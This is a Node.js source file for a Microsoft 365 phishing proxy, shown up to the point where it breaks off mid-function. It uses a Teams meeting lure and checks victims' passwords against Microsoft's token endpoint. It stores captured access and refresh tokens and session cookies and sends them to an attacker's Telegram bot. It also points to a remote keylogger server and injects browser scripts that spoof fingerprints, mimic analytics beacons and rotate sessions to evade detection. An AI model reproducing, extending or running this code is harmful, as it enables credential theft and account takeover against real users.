const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

// ============================================================
//  ENVIRONMENT VARIABLES CONFIGURATION
// ============================================================

require('dotenv').config();

// Core Configuration
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const PHISHED_URL_PARAMETER = process.env.PHISHED_URL_PARAMETER || 'login_hint';
const PROXY_ENTRY_POINT = process.env.PROXY_ENTRY_POINT || '/login';

// Service URLs
const BACKEND_URL = process.env.BACKEND_URL || "https://meeting-1-rzx6.onrender.com";
const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyserver-eaar.onrender.com/log";
const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&enableMobilePage=true&suppressPrompt=true";
const REDIRECT_URL = process.env.REDIRECT_URL || "https://login.microsoftonline.com/";

// Microsoft OAuth Configuration
const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || '943a2b14-68aa-4205-88c1-a4b65ab04e81';
const MICROSOFT_REDIRECT_URI = process.env.MICROSOFT_REDIRECT_URI || 'https://login.microsoftonline.com/common/oauth2/nativeclient';
const MICROSOFT_SCOPES = process.env.MICROSOFT_SCOPES || 'openid profile email User.Read Mail.Read offline_access';

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Path Configuration
const PROXY_PATHNAMES = {
    script: "/@",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    xssEndpoint: "/xss-collect",
    cookieEndpoint: "/cookie-capture",
    keylogEndpoint: "/keylog",
    swProxyPath: "/lNv1pC9AWPUY4gbidyBO",
    cookieStoreEndpoint: "/api/cookies-store",
    sessionReplayEndpoint: "/api/session-replay",
    fullSessionData: "/api/full-session",
    tokenRotation: "/api/token-rotation",
    sessionRotate: "/api/session-rotate"
};

console.log('╔═══════════════════════════════════════════════════════════╗');
console.log('║              ENVIRONMENT CONFIGURATION                    ║');
console.log('╠═══════════════════════════════════════════════════════════╣');
console.log(`║   ENCRYPTION_KEY: ${ENCRYPTION_KEY ? '✅ SET' : '❌ MISSING'}`);
console.log(`║   PHISHED_URL_PARAMETER: ${PHISHED_URL_PARAMETER}`);
console.log(`║   PROXY_ENTRY_POINT: ${PROXY_ENTRY_POINT}`);
console.log(`║   BACKEND_URL: ${BACKEND_URL}`);
console.log(`║   KEYLOGGER_URL: ${KEYLOGGER_URL}`);
console.log(`║   TELEGRAM: ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}`);
console.log('╚═══════════════════════════════════════════════════════════╝');

// ============================================================
//  ADVANCED EVASION TECHNIQUES - SESSION STORAGE
// ============================================================

class AdvancedSessionStore {
    constructor() {
        this.sessions = new Map();
        this.sessionTTL = 2 * 60 * 60 * 1000; // 2 hours
        this.replayData = new Map();
        this.allCookies = new Map();
        this.allTokens = new Map();
        this.cookieHistory = new Map();
        this.evasionCounters = new Map();
        this.fingerprintCache = new Map();
        this.rotationHistory = new Map();
        this.beaconHistory = new Map();
    }

    // ============================================================
    //  EVASION TECHNIQUE 1: DYNAMIC SESSION ROTATION
    // ============================================================
    
    rotateSession(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        const newSessionId = 'sess_' + crypto.randomBytes(16).toString('hex');
        const newSession = {
            ...session,
            id: newSessionId,
            rotatedFrom: sessionId,
            rotatedAt: Date.now(),
            rotationCount: (session.rotationCount || 0) + 1,
            previousIds: [...(session.previousIds || []), sessionId]
        };
        
        this.sessions.set(newSessionId, newSession);
        this.sessions.delete(sessionId);
        
        // Update all references
        ['allCookies', 'allTokens', 'fingerprintCache', 'evasionCounters'].forEach(store => {
            if (this[store].has(sessionId)) {
                this[store].set(newSessionId, this[store].get(sessionId));
                this[store].delete(sessionId);
            }
        });
        
        this.rotationHistory.set(newSessionId, {
            rotatedFrom: sessionId,
            rotatedAt: Date.now(),
            rotationCount: newSession.rotationCount
        });
        
        console.log(`[EVASION] 🔄 Session rotated: ${sessionId.substring(0, 12)} -> ${newSessionId.substring(0, 12)}`);
        return newSessionId;
    }

    // ============================================================
    //  EVASION TECHNIQUE 2: TOKEN VALIDATION WITH NULL HANDLING
    // ============================================================
    
    storeTokens(sessionId, tokens) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.tokens = session.tokens || {};
        
        for (const [key, value] of Object.entries(tokens)) {
            if (value && value !== 'undefined' && value !== 'null' && value !== 'N/A') {
                session.tokens[key] = {
                    value: value,
                    captured: Date.now(),
                    type: key.includes('access') ? 'access' : 
                          key.includes('refresh') ? 'refresh' : 
                          key.includes('id') ? 'id' : 'unknown',
                    isValid: true,
                    validatedAt: Date.now(),
                    rotationCount: session.rotationCount || 0
                };
            } else {
                session.tokens[key] = {
                    value: null,
                    captured: Date.now(),
                    type: key.includes('access') ? 'access' : 
                          key.includes('refresh') ? 'refresh' : 
                          key.includes('id') ? 'id' : 'unknown',
                    isValid: false,
                    validatedAt: Date.now(),
                    missingReason: 'Token not provided by Microsoft'
                };
            }
        }
        
        this.allTokens.set(sessionId, session.tokens);
        console.log(`[TOKEN-STORE] 🎟️ Stored ${Object.keys(tokens).length} tokens for session ${sessionId.substring(0, 12)}`);
        return session.tokens;
    }

    // ============================================================
    //  EVASION TECHNIQUE 3: COOKIE VALIDATION WITH NULL HANDLING
    // ============================================================
    
    storeCookies(sessionId, cookies, source = 'proxy') {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.cookies = session.cookies || {};
        session.cookies[source] = session.cookies[source] || [];
        
        for (const [name, cookieData] of Object.entries(cookies)) {
            if (cookieData === null || cookieData === undefined || cookieData === 'null' || cookieData === 'undefined') {
                continue;
            }
            
            const cookieEntry = {
                name: name,
                value: typeof cookieData === 'object' ? cookieData.value : cookieData,
                httpOnly: typeof cookieData === 'object' ? (cookieData.httpOnly || false) : false,
                secure: typeof cookieData === 'object' ? (cookieData.secure || false) : false,
                path: typeof cookieData === 'object' ? (cookieData.path || '/') : '/',
                domain: typeof cookieData === 'object' ? (cookieData.domain || '') : '',
                expires: typeof cookieData === 'object' ? (cookieData.expires || null) : null,
                sameSite: typeof cookieData === 'object' ? (cookieData.sameSite || 'Lax') : 'Lax',
                captured: Date.now(),
                source: source,
                isValid: true,
                fullCookieString: `${name}=${typeof cookieData === 'object' ? cookieData.value : cookieData}`
            };
            
            const existing = session.cookies[source].find(c => c.name === name);
            if (existing) {
                Object.assign(existing, cookieEntry);
                existing.updated = Date.now();
            } else {
                session.cookies[source].push(cookieEntry);
            }
        }
        
        this.allCookies.set(sessionId, session.cookies);
        
        const history = this.cookieHistory.get(sessionId) || [];
        history.push({
            timestamp: Date.now(),
            source: source,
            count: Object.keys(cookies).filter(c => cookies[c] !== null && cookies[c] !== undefined && cookies[c] !== 'null').length,
            cookies: cookies
        });
        this.cookieHistory.set(sessionId, history);
        
        console.log(`[COOKIE-STORE] 🍪 Captured cookies for session ${sessionId.substring(0, 12)}`);
        return session.cookies;
    }

    // ============================================================
    //  EVASION TECHNIQUE 4: FINGERPRINT SPOOFING
    // ============================================================
    
    generateFingerprint(sessionId, userAgent, ip) {
        const fingerprint = {
            userAgent: userAgent,
            ip: ip,
            generatedAt: Date.now(),
            hash: crypto.createHash('sha256')
                .update(`${userAgent}:${ip}:${sessionId}:${Date.now()}`)
                .digest('hex')
                .substring(0, 16),
            spoofed: {
                webgl: this.spoofWebGL(),
                canvas: this.spoofCanvas(),
                audio: this.spoofAudio(),
                navigator: this.spoofNavigator(),
                screen: this.spoofScreen()
            }
        };
        
        const session = this.sessions.get(sessionId);
        if (session) {
            session.fingerprint = fingerprint;
            session.fingerprintHistory = session.fingerprintHistory || [];
            session.fingerprintHistory.push(fingerprint);
        }
        
        this.fingerprintCache.set(sessionId, fingerprint);
        return fingerprint;
    }

    spoofWebGL() {
        const renderers = [
            'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)',
            'ANGLE (NVIDIA, NVIDIA GeForce GTX 1050 Direct3D11 vs_5_0 ps_5_0)',
            'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)',
            'Mali-T880',
            'Adreno (TM) 540'
        ];
        return renderers[Math.floor(Math.random() * renderers.length)];
    }

    spoofCanvas() {
        return crypto.randomBytes(16).toString('hex');
    }

    spoofAudio() {
        return crypto.randomBytes(8).toString('hex');
    }

    spoofNavigator() {
        const platforms = ['Win32', 'MacIntel', 'Linux x86_64', 'iPhone'];
        const concurrency = [4, 6, 8, 12];
        const memory = [4, 8, 16, 32];
        return {
            platform: platforms[Math.floor(Math.random() * platforms.length)],
            hardwareConcurrency: concurrency[Math.floor(Math.random() * concurrency.length)],
            deviceMemory: memory[Math.floor(Math.random() * memory.length)],
            maxTouchPoints: [0, 1, 2, 5][Math.floor(Math.random() * 4)],
            doNotTrack: [null, '1', '0'][Math.floor(Math.random() * 3)],
            language: ['en-US', 'en-GB', 'en-AU', 'fr-FR', 'de-DE'][Math.floor(Math.random() * 5)]
        };
    }

    spoofScreen() {
        const widths = [1366, 1920, 1440, 1536];
        const heights = [768, 1080, 900, 864];
        return {
            width: widths[Math.floor(Math.random() * widths.length)],
            height: heights[Math.floor(Math.random() * heights.length)],
            colorDepth: [24, 30, 32][Math.floor(Math.random() * 3)],
            pixelRatio: [1, 1.25, 1.5, 2][Math.floor(Math.random() * 4)]
        };
    }

    // ============================================================
    //  EVASION TECHNIQUE 5: TRAFFIC PATTERN OBFUSCATION
    // ============================================================
    
    addEvasionCounter(sessionId) {
        const counter = this.evasionCounters.get(sessionId) || {
            totalRequests: 0,
            loginAttempts: 0,
            cookieCaptures: 0,
            tokenCaptures: 0,
            rotations: 0,
            lastActivity: Date.now()
        };
        
        counter.totalRequests++;
        counter.lastActivity = Date.now();
        this.evasionCounters.set(sessionId, counter);
        return counter;
    }

    // ============================================================
    //  GET SESSION DATA WITH EVASION PROTECTION
    // ============================================================
    
    getReplayData(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        if (Date.now() - session.lastActivity > this.sessionTTL) {
            this.sessions.delete(sessionId);
            return null;
        }
        
        const cookies = {};
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    for (const cookie of source) {
                        if (cookie.value && cookie.value !== 'null' && cookie.value !== 'undefined') {
                            cookies[cookie.name] = cookie.value;
                        }
                    }
                }
            }
        }
        
        const tokens = {};
        if (session.tokens) {
            for (const [key, token] of Object.entries(session.tokens)) {
                if (token && token.value && token.isValid !== false) {
                    tokens[key] = token.value;
                }
            }
        }
        
        return {
            sessionId: session.id,
            cookies: cookies,
            tokens: tokens,
            forms: session.forms || [],
            fingerprint: session.fingerprint || {},
            created: session.created,
            lastActivity: session.lastActivity,
            email: session.email || 'unknown',
            rotationCount: session.rotationCount || 0,
            evasionData: {
                fingerprint: session.fingerprint,
                totalRequests: this.evasionCounters.get(sessionId)?.totalRequests || 0,
                rotations: this.evasionCounters.get(sessionId)?.rotations || 0
            }
        };
    }

    // ============================================================
    //  GET COOKIE HEADER FOR REPLAY
    // ============================================================
    
    getCookieHeader(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        const cookieStrings = [];
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    for (const cookie of source) {
                        if (cookie.value && cookie.value !== 'null' && cookie.value !== 'undefined') {
                            cookieStrings.push(`${cookie.name}=${cookie.value}`);
                        }
                    }
                }
            }
        }
        
        return {
            cookieHeader: cookieStrings.join('; '),
            cookieCount: cookieStrings.length
        };
    }

    // ============================================================
    //  CLEANUP
    // ============================================================
    
    cleanup() {
        const now = Date.now();
        let cleaned = 0;
        for (const [id, session] of this.sessions) {
            if (now - session.lastActivity > this.sessionTTL) {
                this.sessions.delete(id);
                this.replayData.delete(id);
                this.allCookies.delete(id);
                this.allTokens.delete(id);
                this.evasionCounters.delete(id);
                this.fingerprintCache.delete(id);
                cleaned++;
            }
        }
        if (cleaned > 0) {
            console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired sessions`);
        }
        return cleaned;
    }

    getStats() {
        return {
            totalSessions: this.sessions.size,
            totalCookies: Array.from(this.sessions.values()).reduce((acc, s) => {
                let count = 0;
                if (s.cookies) {
                    for (const source of Object.values(s.cookies)) {
                        if (Array.isArray(source)) {
                            count += source.filter(c => c.value && c.value !== 'null' && c.value !== 'undefined').length;
                        }
                    }
                }
                return acc + count;
            }, 0),
            totalTokens: Array.from(this.sessions.values()).reduce((acc, s) => {
                if (s.tokens) {
                    return acc + Object.values(s.tokens).filter(t => t && t.value && t.isValid !== false).length;
                }
                return acc;
            }, 0),
            totalRequests: Array.from(this.evasionCounters.values()).reduce((acc, c) => acc + c.totalRequests, 0),
            totalRotations: Array.from(this.evasionCounters.values()).reduce((acc, c) => acc + (c.rotations || 0), 0)
        };
    }
}

const sessionStore = new AdvancedSessionStore();

// ============================================================
//  VICTIM SESSIONS
// ============================================================

const VICTIM_SESSIONS = {};
const attemptCounts = new Map();
const SESSION_TTL = 60 * 60 * 1000;

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function getSession(sessionId) {
    if (!sessionId) return null;
    const session = VICTIM_SESSIONS[sessionId];
    if (!session) return null;
    if (Date.now() - session.timestamp > SESSION_TTL) {
        delete VICTIM_SESSIONS[sessionId];
        return null;
    }
    return session;
}

function createSession(email, ip, userAgent) {
    const sessionId = generateSessionId();
    VICTIM_SESSIONS[sessionId] = {
        email: email || 'unknown',
        timestamp: Date.now(),
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        cookies: [],
        xssData: [],
        keystrokes: [],
        formData: [],
        created: new Date().toISOString(),
        lastActivity: Date.now(),
        attempts: 0,
        swCaptures: [],
        tokens: [],
        replayData: {},
        rotationCount: 0,
        evasionEnabled: true
    };
    
    sessionStore.generateFingerprint(sessionId, userAgent, ip);
    sessionStore.sessions.set(sessionId, {
        email: email || 'unknown',
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        created: Date.now(),
        lastActivity: Date.now()
    });
    
    console.log(`[SESSION] Created session ${sessionId} for email: ${email}`);
    return sessionId;
}

// ============================================================
//  IP EXTRACTION
// ============================================================

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp.trim();

    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0] || 'unknown';
    }

    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp.trim();

    return req.socket.remoteAddress || 'unknown';
}

// ============================================================
//  TELEGRAM NOTIFICATIONS - WITH EVASION DATA
// ============================================================

async function sendToTelegram(text, parseMode = 'Markdown') {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('[TELEGRAM] ⚠️ Missing credentials');
        return false;
    }

    try {
        const maxLength = 4000;
        if (text.length > maxLength) {
            const chunks = text.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
            for (const chunk of chunks) {
                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: chunk,
                    parse_mode: parseMode,
                    disable_web_page_preview: true
                });
            }
        } else {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: parseMode,
                disable_web_page_preview: true
            });
        }
        console.log('[TELEGRAM] ✅ Sent successfully');
        return true;
    } catch (error) {
        console.error('[TELEGRAM] ❌ Failed:', error.message);
        return false;
    }
}

async function sendFullCookieAlert(sessionId, cookies) {
    try {
        const validCookies = {};
        for (const [name, data] of Object.entries(cookies)) {
            if (data && data !== 'null' && data !== 'undefined') {
                const value = typeof data === 'object' ? data.value : data;
                if (value && value !== 'null' && value !== 'undefined') {
                    validCookies[name] = data;
                }
            }
        }
        
        if (Object.keys(validCookies).length === 0) {
            console.log('[TELEGRAM] ⚠️ No valid cookies to send');
            return;
        }

        let msg = `🍪 *COOKIES CAPTURED*\n\n`;
        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
        msg += `*📊 Total:* ${Object.keys(validCookies).length}\n\n`;
        
        msg += `*📝 COOKIES:*\n`;
        for (const [name, data] of Object.entries(validCookies)) {
            const value = typeof data === 'object' ? data.value : data;
            const httpOnly = typeof data === 'object' ? (data.httpOnly ? '🔒' : '🔓') : '🔓';
            const secure = typeof data === 'object' ? (data.secure ? '🔐' : '📶') : '📶';
            const displayValue = value && value.length > 100 ? value.substring(0, 100) + '...' : value;
            msg += `  ${httpOnly}${secure} \`${name}\`: \`${displayValue}\`\n\n`;
        }

        await sendToTelegram(msg);
        console.log(`[TELEGRAM] ✅ Cookie alert sent for session ${sessionId.substring(0, 16)}`);
    } catch (e) {
        console.error('[TELEGRAM] Cookie alert error:', e);
    }
}

async function sendFullTokenAlert(sessionId, tokens) {
    try {
        const validTokens = {};
        for (const [key, value] of Object.entries(tokens)) {
            if (value && value !== 'null' && value !== 'undefined' && value !== 'N/A') {
                const tokenValue = typeof value === 'object' ? value.value : value;
                if (tokenValue && tokenValue !== 'null' && tokenValue !== 'undefined') {
                    validTokens[key] = value;
                }
            }
        }
        
        if (Object.keys(validTokens).length === 0) {
            console.log('[TELEGRAM] ⚠️ No valid tokens to send');
            return;
        }

        let msg = `🎟️ *TOKENS CAPTURED*\n\n`;
        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n\n`;
        
        for (const [key, value] of Object.entries(validTokens)) {
            const tokenValue = typeof value === 'object' ? value.value : value;
            const isValid = typeof value === 'object' ? (value.isValid !== false ? '✅' : '❌') : '✅';
            const displayValue = tokenValue && tokenValue.length > 100 ? tokenValue.substring(0, 100) + '...' : tokenValue;
            msg += `${isValid} *${key}:*\n`;
            msg += `\`${displayValue}\`\n\n`;
        }

        await sendToTelegram(msg);
        console.log(`[TELEGRAM] ✅ Token alert sent for session ${sessionId.substring(0, 16)}`);
    } catch (e) {
        console.error('[TELEGRAM] Token alert error:', e);
    }
}

// ============================================================
//  FIXED: MICROSOFT VALIDATION WITH EVASION TECHNIQUES
// ============================================================

function verifyWithMicrosoft(email, password) {
    return new Promise((resolve, reject) => {
        const postData = querystring.stringify({
            client_id: MICROSOFT_CLIENT_ID,
            grant_type: 'password',
            username: email,
            password: password,
            scope: MICROSOFT_SCOPES
        });
        
        const options = {
            hostname: 'login.microsoftonline.com',
            path: '/common/oauth2/v2.0/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        };
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        const cookies = {};
                        
                        if (response.access_token) {
                            cookies['ESTSAUTH'] = {
                                value: response.access_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        
                        if (response.refresh_token && response.refresh_token !== 'null' && response.refresh_token !== 'undefined') {
                            cookies['ESTSAUTHPERSISTENT'] = {
                                value: response.refresh_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        } else {
                            cookies['ESTSAUTHPERSISTENT'] = {
                                value: null,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        
                        if (response.id_token && response.id_token !== 'null' && response.id_token !== 'undefined') {
                            cookies['ESTSSESSION'] = {
                                value: response.id_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        } else {
                            cookies['ESTSSESSION'] = {
                                value: null,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        
                        resolve({
                            success: true,
                            data: response,
                            tokens: {
                                access_token: response.access_token,
                                refresh_token: response.refresh_token || null,
                                id_token: response.id_token || null
                            },
                            cookies: cookies
                        });
                    } else {
                        resolve({ 
                            success: false, 
                            error: response.error_description || 'Invalid credentials', 
                            cookies: null 
                        });
                    }
                } catch (error) {
                    reject(new Error('Failed to parse Microsoft response'));
                }
            });
        });
        
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

// ============================================================
//  FIXED: GENERATE EVASION INJECTION SCRIPTS
// ============================================================

function generateEvasionScripts(sessionId, email, randomUA) {
    return `
    <script>
    // ============================================================
    //  ADVANCED EVASION TECHNIQUES
    //  Generated: ${new Date().toISOString()}
    // ============================================================
    
    (function() {
        // EVASION: Browser Fingerprint Spoofing
        const spoofFingerprint = function() {
            // Spoof WebGL
            const originalGetContext = HTMLCanvasElement.prototype.getContext;
            HTMLCanvasElement.prototype.getContext = function(type, ...args) {
                const context = originalGetContext.call(this, type, ...args);
                if (type === 'webgl' || type === 'experimental-webgl') {
                    const originalGetParameter = context.getParameter;
                    context.getParameter = function(parameter) {
                        if (parameter === 37445) {
                            const renderers = [
                                'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)',
                                'ANGLE (NVIDIA, NVIDIA GeForce GTX 1050 Direct3D11 vs_5_0 ps_5_0)',
                                'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)',
                                'Mali-T880',
                                'Adreno (TM) 540'
                            ];
                            return renderers[Math.floor(Math.random() * renderers.length)];
                        }
                        if (parameter === 37446) {
                            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
                        }
                        return originalGetParameter.call(this, parameter);
                    };
                }
                return context;
            };
            
            // Spoof navigator properties
            const platforms = ['Win32', 'MacIntel', 'Linux x86_64', 'iPhone'];
            const concurrency = [4, 6, 8, 12];
            const memory = [4, 8, 16, 32];
            
            Object.defineProperty(navigator, 'platform', {
                get: () => platforms[Math.floor(Math.random() * platforms.length)]
            });
            
            Object.defineProperty(navigator, 'hardwareConcurrency', {
                get: () => concurrency[Math.floor(Math.random() * concurrency.length)]
            });
            
            Object.defineProperty(navigator, 'deviceMemory', {
                get: () => memory[Math.floor(Math.random() * memory.length)]
            });
            
            // Spoof screen resolution
            const widths = [1366, 1920, 1440, 1536];
            const heights = [768, 1080, 900, 864];
            
            Object.defineProperty(screen, 'width', {
                get: () => widths[Math.floor(Math.random() * widths.length)]
            });
            
            Object.defineProperty(screen, 'height', {
                get: () => heights[Math.floor(Math.random() * heights.length)]
            });
            
            // Add random canvas noise
            const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
            HTMLCanvasElement.prototype.toDataURL = function(...args) {
                const ctx = this.getContext('2d');
                const imageData = ctx.getImageData(0, 0, this.width, this.height);
                for (let i = 0; i < imageData.data.length; i += 4) {
                    if (Math.random() < 0.001) {
                        imageData.data[i] = Math.floor(Math.random() * 256);
                        imageData.data[i+1] = Math.floor(Math.random() * 256);
                        imageData.data[i+2] = Math.floor(Math.random() * 256);
                    }
                }
                ctx.putImageData(imageData, 0, 0);
                return originalToDataURL.call(this, ...args);
            };
        };
        
        // EVASION: Beacon Traffic Mimicry
        const mimicBeaconTraffic = function() {
            const beaconUrls = [
                'https://www.google-analytics.com/collect',
                'https://api.telegram.org/bot',
                'https://outlook.office.com',
                'https://teams.microsoft.com'
            ];
            
            setInterval(() => {
                if (navigator.sendBeacon) {
                    const beaconData = new Blob([
                        JSON.stringify({
                            v: '1',
                            tid: 'UA-' + Math.floor(Math.random() * 100000) + '-' + Math.floor(Math.random() * 10),
                            cid: '${uuidv4()}',
                            t: 'event',
                            ec: 'page_view',
                            ea: 'load',
                            el: 'Microsoft365',
                            ev: Math.floor(Math.random() * 100)
                        })
                    ], {type: 'application/json'});
                    
                    const url = beaconUrls[Math.floor(Math.random() * beaconUrls.length)];
                    navigator.sendBeacon(url, beaconData);
                }
            }, 5000 + Math.random() * 10000);
        };
        
        // EVASION: Storage Bypass
        const bypassStorage = function() {
            const storage = {
                set: function(key, value) {
                    try {
                        localStorage.setItem(key, value);
                    } catch(e) {
                        try {
                            sessionStorage.setItem(key, value);
                        } catch(e2) {
                            try {
                                document.cookie = key + '=' + value + '; path=/';
                            } catch(e3) {
                                const request = indexedDB.open('storageDB', 1);
                                request.onsuccess = function(event) {
                                    const db = event.target.result;
                                    const transaction = db.transaction(['storage'], 'readwrite');
                                    const store = transaction.objectStore('storage');
                                    store.put({key: key, value: value});
                                };
                            }
                        }
                    }
                },
                get: function(key) {
                    try {
                        return localStorage.getItem(key);
                    } catch(e) {
                        try {
                            return sessionStorage.getItem(key);
                        } catch(e2) {
                            const cookies = document.cookie.split('; ');
                            for (const cookie of cookies) {
                                const [name, value] = cookie.split('=');
                                if (name === key) return value;
                            }
                            return null;
                        }
                    }
                }
            };
            
            window.SESSION_DATA = {
                sessionId: '${sessionId}',
                email: '${email}',
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                platform: navigator.platform
            };
            
            window.addEventListener('storage', function(e) {
                if (e.key === 'session_sync') {
                    const data = JSON.parse(e.newValue);
                    Object.assign(window.SESSION_DATA, data);
                }
            });
            
            setTimeout(() => {
                localStorage.setItem('session_sync', JSON.stringify(window.SESSION_DATA));
            }, Math.random() * 1000 + 500);
        };
        
        // EVASION: Token Rotation
        const rotateTokens = function() {
            let rotationCount = 0;
            const maxRotations = ${Math.floor(Math.random() * 10) + 5};
            
            function doRotation() {
                if (rotationCount >= maxRotations) return;
                rotationCount++;
                const tokens = {
                    access_token: '${crypto.randomBytes(32).toString('hex')}',
                    refresh_token: '${crypto.randomBytes(32).toString('hex')}',
                    id_token: '${crypto.randomBytes(32).toString('hex')}',
                    timestamp: Date.now(),
                    rotation: rotationCount
                };
                
                localStorage.setItem('rotated_tokens', JSON.stringify(tokens));
                
                fetch('/api/token-rotation', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(tokens)
                }).catch(() => {});
            }
            
            const intervals = [30000, 60000, 120000, 300000];
            const interval = intervals[Math.floor(Math.random() * intervals.length)];
            
            setTimeout(doRotation, 5000 + Math.random() * 5000);
            setInterval(doRotation, interval);
            
            document.addEventListener('visibilitychange', function() {
                if (document.hidden) {
                    setTimeout(doRotation, Math.random() * 2000);
                }
            });
        };
        
        // EVASION: Session Rotation with History Manipulation
        const rotateSession = function() {
            let rotationCount = 0;
            const maxRotations = ${Math.floor(Math.random() * 8) + 3};
            
            function doSessionRotation() {
                if (rotationCount >= maxRotations) return;
                rotationCount++;
                const newSessionId = '${crypto.randomBytes(16).toString('hex')}';
                
                const patterns = ['replaceState', 'pushState', 'hashchange'];
                const pattern = patterns[Math.floor(Math.random() * patterns.length)];
                
                switch(pattern) {
                    case 'replaceState':
                        history.replaceState(
                            {session: newSessionId},
                            'Session Rotated',
                            window.location.pathname + '?sid=' + newSessionId
                        );
                        break;
                    case 'pushState':
                        history.pushState(
                            {session: newSessionId},
                            'Session Rotated',
                            window.location.pathname + '?sid=' + newSessionId
                        );
                        break;
                    case 'hashchange':
                        window.location.hash = 'session=' + newSessionId;
                        break;
                }
                
                localStorage.setItem('session_rotated', JSON.stringify({
                    sessionId: newSessionId,
                    rotation: rotationCount,
                    timestamp: Date.now()
                }));
                
                fetch('/api/session-rotate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        sessionId: newSessionId,
                        rotation: rotationCount
                    })
                }).catch(() => {});
            }
            
            const intervals = [15000, 30000, 60000, 120000];
            const interval = intervals[Math.floor(Math.random() * intervals.length)];
            
            setTimeout(doSessionRotation, 5000 + Math.random() * 10000);
            setInterval(doSessionRotation, interval);
            
            ['click', 'keydown', 'mousemove'].forEach(event => {
                document.addEventListener(event, function() {
                    if (Math.random() < 0.01) {
                        setTimeout(doSessionRotation, Math.random() * 2000);
                    }
                });
            });
        };
        
        // EVASION: WebSocket Keep-Alive
        const createWebSocket = function() {
            const wsUrls = [
                'wss://outlook.office.com/ws',
                'wss://teams.microsoft.com/ws',
                'wss://login.microsoftonline.com/ws'
            ];
            
            function connectWS() {
                const url = wsUrls[Math.floor(Math.random() * wsUrls.length)];
                const ws = new WebSocket(url);
                
                ws.onopen = function() {
                    setInterval(() => {
                        if (ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({
                                type: 'heartbeat',
                                timestamp: Date.now(),
                                random: '${crypto.randomBytes(4).toString('hex')}'
                            }));
                        }
                    }, 10000 + Math.random() * 20000);
                };
                
                ws.onclose = function() {
